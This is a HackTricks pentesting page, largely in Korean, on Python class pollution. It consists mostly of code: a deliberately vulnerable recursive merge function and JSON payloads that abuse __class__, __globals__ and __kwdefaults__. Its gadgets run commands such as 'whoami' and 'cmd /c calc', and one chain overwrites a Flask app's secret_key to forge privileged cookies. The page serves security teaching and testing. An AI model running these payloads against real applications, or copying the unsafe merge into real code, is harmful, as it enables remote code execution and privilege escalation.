# Class Pollution (Python's Prototype Pollution)

{{#include ../../banners/hacktricks-training.md}}

## 기본 예제

문자열을 사용하여 객체의 class를 오염시키는 방법을 확인하세요:<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## 기본 취약점 예시
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Gadget 예시

<details>

<summary>class property의 default value를 생성하여 RCE (subprocess)</summary><sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary><code>globals</code>를 통한 다른 class 및 global vars 오염</summary><sup>[[1]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>임의의 subprocess 실행</summary><sup>[[1]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary><strong><code>__kwdefaults__</code></strong> 덮어쓰기</summary>

**`__kwdefaults__`**는 모든 함수에 존재하는 특수 속성으로, Python [documentation](https://docs.python.org/3/library/inspect.html)에 따르면 “**keyword-only** 매개변수의 모든 기본값에 대한 매핑”입니다. 이 속성을 오염시키면 함수의 keyword-only 매개변수에 대한 기본값을 제어할 수 있습니다. 이는 \* 또는 \*args 뒤에 오는 함수의 매개변수입니다.<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>파일 전체에서 Flask secret 덮어쓰기</summary>

따라서 웹의 main python file에 정의된 객체에 대해 class pollution을 수행할 수 있지만, **해당 객체의 class가 main file과 다른 파일에 정의되어 있는 경우**를 생각해 보겠습니다. 이전 payload에서 \_\_globals\_\_에 액세스하려면 객체의 class 또는 해당 class의 methods에 액세스해야 하므로, **해당 파일의 globals에는 액세스할 수 있지만 main file의 globals에는 액세스할 수 없습니다**. \
따라서 main page에서 **secret key**를 정의한 **Flask app global object에 액세스할 수 없습니다**:<sup>[[1]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
이 시나리오에서는 파일을 탐색하여 주요 파일에 도달하고, **전역 객체 `app.secret_key`에 액세스**하여 Flask secret key를 변경한 다음 이 키를 알고 [**권한을 상승**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)할 수 있도록 하는 gadget이 필요합니다.

[이 writeup](https://ctftime.org/writeup/36082)의 다음과 같은 payload:<sup>[[2]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Use this payload to **`app.secret_key`를 변경**(앱에서 사용하는 이름은 다를 수 있음)하여 새롭고 더 높은 권한의 flask 쿠키에 서명할 수 있도록 하세요.

</details>

더 많은 read only gadgets는 다음 페이지도 확인하세요:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## References

- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)

{{#include ../../banners/hacktricks-training.md}}
